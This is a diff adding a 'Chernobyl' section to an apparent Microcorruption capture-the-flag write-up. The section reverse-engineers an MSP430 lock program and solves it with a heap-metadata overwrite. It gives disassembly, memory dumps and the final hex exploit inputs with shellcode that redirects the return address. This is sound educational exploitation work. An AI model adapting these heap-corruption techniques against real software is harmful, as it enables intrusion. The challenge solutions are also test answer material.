@@ -17,6 +17,7 @@
 - [Vladivostok](#vladivostok)
 - [Bangalore](#bangalore)
 - [Lagos](#lagos)
+- [Chernobyl](#chernobyl)
 
 ## Introduction
 
@@ -988,3 +989,340 @@ mov @r9+,pc
 ### Solved
 
 password = AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWX9Pzz9pl4BF2PDT2PfU2PVU0I
+
+## Chernobyl
+
+
+This challenge is the most challenge so far. Although the challenge uses printf. There is no format string exploit or buffer overflow. This challenge deals with exploiting heap metadata. Before getting into that lets figure out how the program works. Instead of there being passwords or usernames and passwords like previous levels. This program has accounts with there own pins. When first starting the program it just tells you to enter 'access [your name] [pin]' to unlock the door. To continue on there is nothing we can do here. We must look at the program for more information. If we put a breakpoint on line 4bba right after entering an input, then step through the program. We can see on line 4bbe the program checks for 'a' at the start of the input. The program then jumps 0x7 on line 4bc6 to check for a space character on line 4bce. After that the program gets the name and pin we gave. But, if we don't have enter access first then program will jump and check for a 'n' at line 4c38. Then skip 0x4 to check for a space. This is a command that isn't told to us. Since the command starts with n and only 3 characters long. We can assume it is "new". Now if we use our new found command we can see that we add our own accounts with pins. If we try and use that account to access we get "Access granted; but account not activated.". Which means accounts get activated some way. When looking through the code you may see comparisons to ';' like on lines 4cda and 4c7c. This is for changing commands like for creating multiple accounts at once. You can test this with "new AAAA 0;new BBBB 1". Another interesting thing is if you add more than 12 account the program will crash with the message "Heap exausted; aborting."
+
+```asm
+
+4b66 <run>
+4b66:  0b12           push	r11
+4b68:  0a12           push	r10
+4b6a:  0912           push	r9
+4b6c:  0812           push	r8
+4b6e:  0712           push	r7
+4b70:  3150 00fa      add	#0xfa00, sp
+4b74:  3e40 0500      mov	#0x5, r14
+4b78:  3f40 0300      mov	#0x3, r15
+4b7c:  b012 7847      call	#0x4778 <create_hash_table>
+4b80:  084f           mov	r15, r8
+4b82:  3f40 384a      mov	#0x4a38, r15
+4b86:  b012 504d      call	#0x4d50 <puts>
+4b8a:  3f40 584a      mov	#0x4a58, r15
+4b8e:  b012 504d      call	#0x4d50 <puts>
+4b92:  3f40 954a      mov	#0x4a95, r15
+4b96:  b012 504d      call	#0x4d50 <puts>
+4b9a:  0e43           clr	r14
+4b9c:  3740 ff05      mov	#0x5ff, r7
+4ba0:  053c           jmp	#0x4bac <run+0x46>
+4ba2:  0f41           mov	sp, r15
+4ba4:  0f5e           add	r14, r15
+4ba6:  cf43 0000      mov.b	#0x0, 0x0(r15)
+4baa:  1e53           inc	r14
+4bac:  079e           cmp	r14, r7
+4bae:  f937           jge	#0x4ba2 <run+0x3c>
+4bb0:  3e40 5005      mov	#0x550, r14
+4bb4:  0f41           mov	sp, r15
+4bb6:  b012 404d      call	#0x4d40 <getsn>
+4bba:  0b41           mov	sp, r11
+4bbc:  923c           jmp	#0x4ce2 <run+0x17c>
+4bbe:  7f90 6100      cmp.b	#0x61, r15
+4bc2:  3a20           jne	#0x4c38 <run+0xd2>
+4bc4:  0e4b           mov	r11, r14
+4bc6:  3e50 0700      add	#0x7, r14
+4bca:  0b4e           mov	r14, r11
+4bcc:  073c           jmp	#0x4bdc <run+0x76>
+4bce:  7f90 2000      cmp.b	#0x20, r15
+4bd2:  0320           jne	#0x4bda <run+0x74>
+4bd4:  cb43 0000      mov.b	#0x0, 0x0(r11)
+4bd8:  043c           jmp	#0x4be2 <run+0x7c>
+4bda:  1b53           inc	r11
+4bdc:  6f4b           mov.b	@r11, r15
+4bde:  4f93           tst.b	r15
+4be0:  f623           jnz	#0x4bce <run+0x68>
+4be2:  1b53           inc	r11
+4be4:  0a43           clr	r10
+4be6:  0b3c           jmp	#0x4bfe <run+0x98>
+4be8:  0d4a           mov	r10, r13
+4bea:  0d5d           add	r13, r13
+4bec:  0d5d           add	r13, r13
+4bee:  0d5a           add	r10, r13
+4bf0:  0d5d           add	r13, r13
+4bf2:  6a4b           mov.b	@r11, r10
+4bf4:  8a11           sxt	r10
+4bf6:  3a50 d0ff      add	#0xffd0, r10
+4bfa:  0a5d           add	r13, r10
+4bfc:  1b53           inc	r11
+4bfe:  6f4b           mov.b	@r11, r15
+4c00:  4f93           tst.b	r15
+4c02:  0324           jz	#0x4c0a <run+0xa4>
+4c04:  7f90 3b00      cmp.b	#0x3b, r15
+4c08:  ef23           jne	#0x4be8 <run+0x82>
+4c0a:  0f48           mov	r8, r15
+4c0c:  b012 cc49      call	#0x49cc <get_from_table>
+4c10:  3f93           cmp	#-0x1, r15
+4c12:  0320           jne	#0x4c1a <run+0xb4>
+4c14:  3f40 964a      mov	#0x4a96, r15
+4c18:  413c           jmp	#0x4c9c <run+0x136>
+4c1a:  0aef           xor	r15, r10
+4c1c:  3af0 ff7f      and	#0x7fff, r10
+4c20:  0820           jnz	#0x4c32 <run+0xcc>
+4c22:  0f9a           cmp	r10, r15
+4c24:  0334           jge	#0x4c2c <run+0xc6>
+4c26:  3f40 a34a      mov	#0x4aa3, r15
+4c2a:  383c           jmp	#0x4c9c <run+0x136>
+4c2c:  3f40 b34a      mov	#0x4ab3, r15
+4c30:  353c           jmp	#0x4c9c <run+0x136>
+4c32:  3f40 de4a      mov	#0x4ade, r15
+4c36:  323c           jmp	#0x4c9c <run+0x136>
+4c38:  7f90 6e00      cmp.b	#0x6e, r15
+4c3c:  4020           jne	#0x4cbe <run+0x158>
+4c3e:  094b           mov	r11, r9
+4c40:  2952           add	#0x4, r9
+4c42:  0b49           mov	r9, r11
+4c44:  073c           jmp	#0x4c54 <run+0xee>
+4c46:  7f90 2000      cmp.b	#0x20, r15
+4c4a:  0320           jne	#0x4c52 <run+0xec>
+4c4c:  cb43 0000      mov.b	#0x0, 0x0(r11)
+4c50:  043c           jmp	#0x4c5a <run+0xf4>
+4c52:  1b53           inc	r11
+4c54:  6f4b           mov.b	@r11, r15
+4c56:  4f93           tst.b	r15
+4c58:  f623           jnz	#0x4c46 <run+0xe0>
+4c5a:  1b53           inc	r11
+4c5c:  0a43           clr	r10
+4c5e:  0b3c           jmp	#0x4c76 <run+0x110>
+4c60:  0c4a           mov	r10, r12
+4c62:  0c5c           add	r12, r12
+4c64:  0c5c           add	r12, r12
+4c66:  0c5a           add	r10, r12
+4c68:  0c5c           add	r12, r12
+4c6a:  6a4b           mov.b	@r11, r10
+4c6c:  8a11           sxt	r10
+4c6e:  3a50 d0ff      add	#0xffd0, r10
+4c72:  0a5c           add	r12, r10
+4c74:  1b53           inc	r11
+4c76:  6f4b           mov.b	@r11, r15
+4c78:  4f93           tst.b	r15
+4c7a:  0324           jz	#0x4c82 <run+0x11c>
+4c7c:  7f90 3b00      cmp.b	#0x3b, r15
+4c80:  ef23           jne	#0x4c60 <run+0xfa>
+4c82:  0a93           tst	r10
+4c84:  0334           jge	#0x4c8c <run+0x126>
+4c86:  3f40 ec4a      mov	#0x4aec, r15
+4c8a:  083c           jmp	#0x4c9c <run+0x136>
+4c8c:  0e49           mov	r9, r14
+4c8e:  0f48           mov	r8, r15
+4c90:  b012 cc49      call	#0x49cc <get_from_table>
+4c94:  3f93           cmp	#-0x1, r15
+4c96:  0524           jeq	#0x4ca2 <run+0x13c>
+4c98:  3f40 124b      mov	#0x4b12, r15
+4c9c:  b012 504d      call	#0x4d50 <puts>
+4ca0:  1c3c           jmp	#0x4cda <run+0x174>
+4ca2:  0a12           push	r10
+4ca4:  0912           push	r9
+4ca6:  3012 2f4b      push	#0x4b2f
+4caa:  b012 4844      call	#0x4448 <printf>
+4cae:  3150 0600      add	#0x6, sp
+4cb2:  0d4a           mov	r10, r13
+4cb4:  0e49           mov	r9, r14
+4cb6:  0f48           mov	r8, r15
+4cb8:  b012 3248      call	#0x4832 <add_to_table>
+4cbc:  0e3c           jmp	#0x4cda <run+0x174>
+4cbe:  3f40 544b      mov	#0x4b54, r15
+4cc2:  b012 504d      call	#0x4d50 <puts>
+4cc6:  1f43           mov	#0x1, r15
+4cc8:  3150 0006      add	#0x600, sp
+4ccc:  3741           pop	r7
+4cce:  3841           pop	r8
+4cd0:  3941           pop	r9
+4cd2:  3a41           pop	r10
+4cd4:  3b41           pop	r11
+4cd6:  3041           ret
+4cd8:  1b53           inc	r11
+4cda:  fb90 3b00 0000 cmp.b	#0x3b, 0x0(r11)
+4ce0:  fb27           jeq	#0x4cd8 <run+0x172>
+4ce2:  6f4b           mov.b	@r11, r15
+4ce4:  4f93           tst.b	r15
+4ce6:  6b23           jnz	#0x4bbe <run+0x58>
+4ce8:  0e43           clr	r14
+4cea:  603f           jmp	#0x4bac <run+0x46>
+
+```
+
+Now that we how the program works let's find any mistakes that the developers may have overlooked. Interestingly I found that if you create more than 12 accounts that are only 1 character the program does not crash with the heap exausted error. I used this as my input, "new A 0;new B 1;new C 2;new D 3;new E 4;new F 5;new G 6;new H 7;new I 8;new J 9;new K 10;new L 11;new M 12". That gives us a clue as to where to look for an exploit. If we check memory address in the 0x5000 range. We can see accounts being placed on the heap. After 5 accounts you can notice a pattern on how they are placed. You may also notice that the next account would be placed on top of heap metadata. After adding the sixth account you can see that the heap metadata is being over written with the account name. Now after adding 11 accounts you can see we filled 2 head chunks and this is where the rehash function will be called to allocate more space. The heap exuasted error occurs, because we have overwritten the heap metadata with "FFFF". Since we can change the heaps metadata we can exploit that to our advantage to allow code execution.
+
+```asm
+
+After adding 5 accounts
+
+Live Memory Dump
+5000:   0050 1050 1500 0500 0300 0500 1650 2c50   .P.P.........P,P
+5010:   0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
+5020:   2252 8252 e252 1050 3c50 2100 0500 0000   "R.R.R.P<P!.....
+5030:   0000 0000 0000 0000 0000 0000 2650 9c50   ............&P.P
+5040:   b500 4141 4141 0000 0000 0000 0000 0000   ..AAAA..........
+5050:   0000 0000 4242 4242 0000 0000 0000 0000   ....BBBB........
+5060:   0000 0000 0100 4343 4343 0000 0000 0000   ......CCCC......
+5070:   0000 0000 0000 0200 4444 4444 0000 0000   ........DDDD....
+5080:   0000 0000 0000 0000 0300 4545 4545 0000   ..........EEEE..
+5090:   0000 0000 0000 0000 0000 0400 3c50 fc50   ............<P.P
+50a0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+50b0:   *
+50f0:   0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
+5100:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5110:   *
+5150:   0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
+5160:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5170:   *
+51b0:   0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
+51c0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+51d0:   *
+5210:   0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
+5220:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5230:   *
+5270:   0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
+5280:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5290:   *
+52d0:   0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R<S
+52e0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+52f0:   *
+5330:   0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
+5340:   7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
+
+After adding a sixth account
+
+Live Memory Dump
+5000:   0050 1050 1500 0600 0300 0500 1650 2c50   .P.P.........P,P
+5010:   0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
+5020:   2252 8252 e252 1050 3c50 2100 0600 0000   "R.R.R.P<P!.....
+5030:   0000 0000 0000 0000 0000 0000 2650 9c50   ............&P.P
+5040:   b500 4141 4141 0000 0000 0000 0000 0000   ..AAAA..........
+5050:   0000 0000 4242 4242 0000 0000 0000 0000   ....BBBB........
+5060:   0000 0000 0100 4343 4343 0000 0000 0000   ......CCCC......
+5070:   0000 0000 0000 0200 4444 4444 0000 0000   ........DDDD....
+5080:   0000 0000 0000 0000 0300 4545 4545 0000   ..........EEEE..
+5090:   0000 0000 0000 0000 0000 0400 4646 4646   ............FFFF
+50a0:   b500 0000 0000 0000 0000 0000 0500 0000   ................
+50b0:   *
+50f0:   0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
+5100:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5110:   *
+5150:   0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
+5160:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5170:   *
+51b0:   0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
+51c0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+51d0:   *
+5210:   0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
+5220:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5230:   *
+5270:   0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
+5280:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5290:   *
+52d0:   0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R<S
+52e0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+52f0:   *
+5330:   0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
+5340:   7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
+
+After adding 11 accounts
+
+Live Memory Dump
+5000:   0050 1050 1500 0b00 0300 0500 1650 2c50   .P.P.........P,P
+5010:   0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
+5020:   2252 8252 e252 1050 3c50 2100 0b00 0000   "R.R.R.P<P!.....
+5030:   0000 0000 0000 0000 0000 0000 2650 9c50   ............&P.P
+5040:   b500 4141 4141 0000 0000 0000 0000 0000   ..AAAA..........
+5050:   0000 0000 4242 4242 0000 0000 0000 0000   ....BBBB........
+5060:   0000 0000 0100 4343 4343 0000 0000 0000   ......CCCC......
+5070:   0000 0000 0000 0200 4444 4444 0000 0000   ........DDDD....
+5080:   0000 0000 0000 0000 0300 4545 4545 0000   ..........EEEE..
+5090:   0000 0000 0000 0000 0000 0400 4646 4646   ............FFFF
+50a0:   b500 0000 0000 0000 0000 0000 0500 4747   ..............GG
+50b0:   4747 0000 0000 0000 0000 0000 0000 0600   GG..............
+50c0:   4848 4848 0000 0000 0000 0000 0000 0000   HHHH............
+50d0:   0700 4949 4949 0000 0000 0000 0000 0000   ..IIII..........
+50e0:   0000 0800 4a4a 4a4a 0000 0000 0000 0000   ....JJJJ........
+50f0:   0000 0000 0900 4b4b 4b4b 0000 9c50 5c51   ......KKKK...P\Q
+5100:   b500 0000 0000 0a00 0000 0000 0000 0000   ................
+5110:   *
+5150:   0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
+5160:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5170:   *
+51b0:   0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
+51c0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+51d0:   *
+5210:   0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
+5220:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5230:   *
+5270:   0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
+5280:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+5290:   *
+52d0:   0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R<S
+52e0:   b500 0000 0000 0000 0000 0000 0000 0000   ................
+52f0:   *
+5330:   0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
+5340:   7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
+
+```
+
+The way I exploit this bug is different than how you'd normally do it. Which requires over writing multiple heap metadata, that allows you to swap out the return function with an address containing shellcode. How I was able to do it required only one chunk of metadata to be overwritten. If you look at line 4cc8 in the run function. You can see that it adds 0x600 to the stack pointer. This skips the pointer down to where the address that the function will return to is located. If we can just overwrite that line we can have the return go to our own shell code. So let's use this as input to test this. Fist we will enter 5 filler accounts, "new AAAA 0;new BBBB 1;new CCCC 2;new DDDD 3;new EEEE 4". Next input will be the new plus a space in hex, along with the line we want to overwrite minus 0x2, the next head chunks location, and the address we want to overwrite again, "6e657720 c64c fc50 c64c". We minus 0x2, because when free is reshuffling the address it is off by that. Next we input more filler accounts, "new FFFF 5;new GGGG 6;new HHHH 7;new IIII 8;new JJJJ 9;new KKKK 10;new LLLL 11". Then lastly "AAAABBBBCCCCDDDD" an input to check if our plan works. If we check what happens to line, 4cc8, it gets overwritten thankfully with something that is opcode. Once we hit the return call we get "insn address unaligned" after and CC in the instruction pointer. Since our plan work we just need to add shellcode.
+
+
+```asm
+
+Before line 4cc8
+
+Live Memory Dump
+3dc0:   004d 0100 124d 0000 0a00 0a00 c644 243e   .M...M.......D$>
+3dd0:   0b00 0000 d43d 0000 0000 ff05 0650 004d   .....=.......P.M
+3de0:   0300 744d 0000 0a00 ec3d c64c |41|41 4141   ..tM.....=.LAAAA
+                                       SP
+3df0:   4242 4242 4343 4343 4444 4444 0000 0000   BBBBCCCCDDDD....
+...
+43f0:   0000 0000 0000 3e44 0000 0000 0000 0000   ......>D........
+
+After line 4cc8
+
+Live Memory Dump
+3dc0:   004d 0100 124d 0000 0a00 0a00 c644 243e   .M...M.......D$>
+3dd0:   0b00 0000 d43d 0000 0000 ff05 0650 004d   .....=.......P.M
+3de0:   0300 744d 0000 0a00 ec3d c64c 4141 4141   ..tM.....=.LAAAA
+3df0:   4242 4242 4343 4343 4444 4444 0000 0000   BBBBCCCCDDDD....
+...
+                                       SP
+43e0:   0000 0000 0000 0000 0000 0000 |00|00 0000   ................
+43f0:   0000 0000 0000 3e44 0000 0000 0000 0000   ......>D........
+
+Overwritten line 4cc8
+
+Current Instruction
+c250 4606
+add.b pc, &0x0646
+
+Changed instruction pointer at return call
+
+Register State
+pc  4343  sp  3df8  sr  0011  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 4141
+r08 4141  r09 4242  r10 4242  r11 4343
+r12 526e  r13 004c  r14 0000  r15 0001
+
+```
+I converted all the inputs to hex and combined them with 3b or ";". This way all the setup is done in one go. So we enter this as our first input, "6e6577204141414120303b6e6577204242424220313b6e6577204343434320323b6e6577204444444420333b6e6577204545454520343b6e657720c64cfc50c64c203b6e6577204646464620353b6e6577204747474720363b6e6577204848484820373b6e6577204949494920383b6e6577204a4a4a4a20393b6e6577204b4b4b4b2031303b6e6577204c4c4c4c203131". Then we enter this, "41414242434344444545f83d30127f00b012ec4c", which is 10 bytes of filler till the return address. The address will use is 3df8, so the return function will return right to where the shell code is. The shell code is like the ones we have used before it just pushes 0x7f on the stack then call the INT function. Entering this input solves the challenge.
+
+```asm
+
+push #0x7f
+call #0x4cec
+
+```
+
+### Solved
+
+input 1: 6e6577204141414120303b6e6577204242424220313b6e6577204343434320323b6e6577204444444420333b6e6577204545454520343b6e657720c64cfc50c64c203b6e6577204646464620353b6e6577204747474720363b6e6577204848484820373b6e6577204949494920383b6e6577204a4a4a4a20393b6e6577204b4b4b4b2031303b6e6577204c4c4c4c203131
+
+input 2: 41414242434344444545f83d30127f00b012ec4c
